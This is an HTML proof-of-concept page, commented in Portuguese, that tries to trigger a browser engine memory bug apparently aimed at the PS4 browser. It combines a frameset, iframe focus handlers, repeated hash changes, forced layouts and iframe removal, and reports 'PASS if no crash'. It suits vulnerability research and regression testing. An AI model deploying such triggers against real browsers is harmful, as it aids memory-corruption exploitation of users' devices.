<!DOCTYPE html>
<html>
<head>
<style>
iframe {
    content: url();
    zoom: 0.01;
    width: 1px;
    height: 1px;
}
</style>
</head>
<body>
<iframe id="i0"></iframe>

<script>
function tryTrigger() {
    // Cria frameset (mesmo do PoC original)
    document.documentElement.appendChild(document.createElement('frameset'));

    i0.onfocus = function() {
        location.hash = 'y';
    };

    location.hash = 'x';

    // Tenta várias formas de forçar foco + layout
    try {
        i0.focus();
    } catch(e) {}

    // Força vários layouts
    for (var i = 0; i < 20; i++) {
        document.body.offsetHeight; // force layout
        try {
            i0.contentDocument; // tenta acessar
        } catch(e) {}
    }

    // Muda o hash várias vezes
    location.hash = 'a';
    location.hash = 'b';
    location.hash = 'c';

    // Tenta destruir o iframe de formas diferentes
    setTimeout(function() {
        try {
            i0.remove();
        } catch(e) {}
        document.body.offsetHeight;
    }, 0);

    setTimeout(function() {
        var p = document.createElement('p');
        p.style.color = 'green';
        p.style.fontWeight = 'bold';
        p.textContent = 'PASS if no crash (código vulnerável presente, mas caminho de trigger limitado)';
        document.body.appendChild(p);
    }, 500);
}

window.onload = function() {
    // Tenta usar Cache API se existir (não vai no PS4)
    if (window.caches && caches.has) {
        caches.has('a').then(function() {
            tryTrigger();
        }).catch(tryTrigger);
    } else {
        setTimeout(tryTrigger, 0);
    }
};
</script>
</body>
</html>
